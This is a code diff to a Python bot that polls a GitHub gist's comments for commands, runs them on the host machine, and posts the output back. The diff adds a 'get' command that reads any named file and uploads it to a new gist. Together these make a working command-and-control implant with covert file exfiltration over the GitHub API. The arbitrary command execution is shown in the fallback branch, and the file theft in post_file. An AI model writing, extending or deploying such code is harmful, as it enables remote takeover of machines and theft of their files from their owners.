@@ -5,7 +5,7 @@ import requests
 from dotenv import dotenv_values
 import time
 
-from utils import create_markdown_comment, get_comment_text, get_markdown_timestamp, get_random_message, parse_markdown_comment
+from utils import create_markdown_comment,  create_markdown_timestamp, get_random_message, parse_markdown_comment
 
 parser = argparse.ArgumentParser(
     prog='bot.py',
@@ -32,7 +32,8 @@ if (github_token is None or args.token is not None):
     github_token = args.token
 
 gist_id = args.gistId
-gist_url = f'https://api.github.com/gists/{gist_id}'
+gists_url = f'https://api.github.com/gists'
+gist_url = f'{gists_url}/{gist_id}'
 comments_url = f'{gist_url}/comments'
 
 headers = {"authorization": f'bearer {github_token}'}
@@ -73,7 +74,7 @@ def get_commands(comments):
 def post_command(command: str):
     def get_message():
         state['command_text'] = state['command_text'] if state['command_text'] is not None else get_random_message()
-        return f"{state['command_text']}\n\n{get_markdown_timestamp()}\n\n{create_markdown_comment(command)}"
+        return f"{state['command_text']}\n\n{create_markdown_timestamp()}\n\n{create_markdown_comment(command)}"
 
     command_comment = state['command_comment']
     log(f'Sending response "{command}"')
@@ -93,6 +94,7 @@ def post_command(command: str):
 
     response = requests.patch(
         f"{comments_url}/{command_comment['id']}", json={"body": get_message()}, headers=headers)
+
     log(response)
     return response
 
@@ -101,7 +103,7 @@ def pong():
 
     def get_message():
         state['pong_text'] = state['pong_text'] if state['pong_text'] is not None else get_random_message()
-        return f"{state['pong_text']}\n\n{get_markdown_timestamp()}\n\n{create_markdown_comment('pong')}"
+        return f"{state['pong_text']}\n\n{create_markdown_timestamp()}\n\n{create_markdown_comment('pong')}"
 
     pong_comment = state['pong_comment']
     log(f'Sending "pong"')
@@ -110,7 +112,6 @@ def pong():
         response = requests.post(
             comments_url, json={"body": get_message()}, headers=headers)
         state['pong_comment'] = response.json()
-        state['last_update'] = state['pong_comment']['updated_at']
         return response
 
     response = requests.get(
@@ -134,17 +135,30 @@ def delete_comments():
     comments = requests.get(comments_url, headers=headers).json()
     for comment in comments:
         comment_id = comment['id']
-        print(f"deleting {comment_id}")
+        log(f"deleting {comment_id}")
         response = requests.delete(
             f'{comments_url}/{comment_id}', headers=headers)
-        print(response)
+        log(response)
+
+
+def post_file(filename):
+    try:
+        file_contents = open(filename, "r").read()
+        gist_response = requests.post(gists_url, json={"files": {filename: {
+                                      "content": file_contents}}, 'description': ''}, headers=headers)
+        file_url = gist_response.json()["files"][filename]["raw_url"]
+        return post_command(f'{filename}:\n{file_url}')
+    except UnicodeDecodeError:
+        log('Could not read file')
+    except FileNotFoundError:
+        log(f'{filename} does not exist')
 
 
 def handle_command(command: str):
     log(f'Received command "{command}"')
     keys = command.split(' ')
-    bin_name, args = keys[0], keys[1:]
-    match bin_name:
+    command_name, args = keys[0], keys[1:]
+    match command_name:
         case 'w':
             result = subprocess.check_output(['w'])
 
@@ -164,15 +178,22 @@ def handle_command(command: str):
             pong()
         case 'clear':
             delete_comments()
+        case 'get':
+            try:
+                post_file(args[0])
+            except IndexError:
+                log("Received no filename")
         case _:
             log('Unknown command: '+command)
             try:
-                result = subprocess.check_output([command]+args)
+                result = subprocess.check_output([command_name]+args)
                 post_command((result.decode('utf-8')))
             except FileNotFoundError:
                 log(f"No such file or directory: '{command}'")
             except PermissionError:
                 log(f"Permission denied: '{command}'")
+            except OSError:
+                log('OSError')
 
 
 while True:
